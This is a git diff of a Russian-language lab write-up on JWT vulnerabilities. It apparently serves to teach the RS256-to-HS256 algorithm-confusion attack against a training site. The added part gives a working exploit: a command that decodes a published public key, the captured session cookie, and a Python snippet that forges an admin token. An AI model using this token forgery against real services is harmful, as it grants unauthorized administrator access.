@@ -1,12 +1,9 @@
-# Тут писать свой ресерч
-
 # Уязвимости
 
-1. Неподписанный JSON запрос (Поддерживается отправка запроса без подписи. Это позволяет менять содержимое payload)
+1. Unverified token problem
 2. Изменение алгоритма подписи с RS256 на HS256
 3. Возможность сбрутить secret key 
  
-
 # Unverified token problem
 
 JWT токен состоит из 3 частей: Header, Payload, Signature. Signature - это подпись, которая вычисляется на основании Header и Payload и зависит от выбранного алгоритма.
@@ -202,28 +199,39 @@ result = jwt.decode(session, key=jwt_secret)
 
 ```
 
-
 # Изменение алгоритма подписи с RS256 на HS256 
 
-Алгоритм HS256 использует secret key, чтобы подписать и проверить каждой сообщение. Алгоритм RS256 испльзует private key для подписи и public key для авторизации.
+Алгоритм HS256 использует secret key, чтобы подписать и проверить каждой сообщение. 
+Алгоритм RS256 испльзует private key для подписи и public key для авторизации.
 
-Если изменить RS256 на HS256, сервер будет использовать public key в качестве secret key, а затем использовать HS256 для верификации сигнатуры. 
+Если изменить RS256 на HS256, сервер будет использовать public key в качестве secret key, 
+а затем использовать HS256 для верификации сигнатуры. 
 
-Так как иногда можно получить public key, можно изменить  алгоритм в header на HS256 и затем подписать public ключом алгоритмом RSA. 
+Так как иногда можно получить public key, можно изменить алгоритм в Header на HS256 и затем подписать
+public ключом алгоритмом RSA. 
 
 Сервер проверит RSA public key + HS256. 
 
 ## Эксплуатация 
 
-### Шаг1 
+### Шаг 1 
 
-Идем на /index_2, получаем 
+Идем на http://jwt_insecure.lab/index_2, на которой расположен base64 от public ключа
+
+![](img/rshs_1.png)
 
 ```
 LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
 ```
 
-Это base64 от ключа. Расшифровываем: https://pastebin.com/16EBZmJf
+Данный ключ необходимо раскодировать в файл public.pem
+
+```bash
+echo -n 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=' | base64 -d > public.pem 
+```
+
+public.pem
+
 ``` 
 -----BEGIN PUBLIC KEY-----
 MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFN8t7aKU1nd6+TPbFEYRfzr3X
@@ -234,5 +242,42 @@ xl+0B0d8bwWwNWOWJwIDAQAB
 ```
 
 
+### Шаг 2
 
+Берем значение session_rsa cookie на http://jwt_insecure.lab/index_2:
+
+![](img/rshs_2.png)
+
+```
+session_rsa=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.iHlggCS_Znz50o0DlfP8YiFTUkQF8X24WlnUwZu6mxgsYHQm8NNibibvhGg1PiSFkbkobtjB3MpkK4UvZEzZS9f7B4D6Z4xneyBeXer2dbyE8tziTZb31RKjYQMOgSDTUTCaj9r04tTX-IrDqC-Q7YR0aau9GCT4nWiLlVnSlNg
+```
+
+Если его декодировать:
+
+```
+- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9 - {"typ":"JWT","alg":"RS256"}
+- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9 - {"username":"user","is_admin":false}
+- Signature: iHlggCS_Znz50o0DlfP8YiFTUkQF8X24WlnUwZu6mxgsYHQm8NNibibvhGg1PiSFkbkobtjB3MpkK4UvZEzZS9f7B4D6Z4xneyBeXer2dbyE8tziTZb31RKjYQMOgSDTUTCaj9r04tTX-IrDqC-Q7YR0aau9GCT4nWiLlVnSlNg
+```
+
+Для генерации нового session_rsa cookie подписанной public ключом, используя код:
+
+```python
+import jwt
+
+file = open('public.pem', 'r').read() # public key
+
+print(jwt.encode({'username': 'user', 'is_admin': True}, # изменяем значение is_admin
+        key=file, 
+        algorithm='HS256') # меняем с RS256 на HS256
+        .decode())
+```
+
+Подставляем полученный токен в cookie
+
+![](img/rshs_3.png)
+
+получаем
+
+![](img/rshs_4.png)
 
